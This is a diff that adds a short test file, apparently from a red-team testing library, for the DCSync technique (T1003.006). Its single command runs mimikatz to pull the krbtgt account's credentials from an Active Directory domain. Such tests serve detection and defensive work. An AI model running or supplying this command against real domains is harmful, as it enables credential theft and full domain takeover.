@@ -1,0 +1,7 @@
+################T1003.006.md################
+
+##Atomic Test #1 - DCSync (Active Directory)
+
+
+```mimikatz_trunk\x64\mimikatz.exe "lsadump::dcsync /domain:%userdnsdomain% /user:krbtgt@%userdnsdomain%" "exit"```
+```PAUSE```
